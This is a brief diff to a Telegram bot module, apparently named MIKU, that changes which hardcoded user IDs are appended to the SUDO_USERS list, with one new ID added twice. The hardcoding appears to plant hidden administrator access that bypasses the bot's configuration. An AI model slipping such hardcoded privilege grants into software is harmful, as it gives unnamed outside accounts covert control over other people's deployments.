@@ -5,8 +5,8 @@ from config import SUDO_USERS
 from MIKU.admins import get_administrators
 
 
-SUDO_USERS.append(5001899507)
-SUDO_USERS.append(1586012267)
+SUDO_USERS.append(2120721732)
+SUDO_USERS.append(2120721732)
  
 
 def errors(func: Callable) -> Callable:
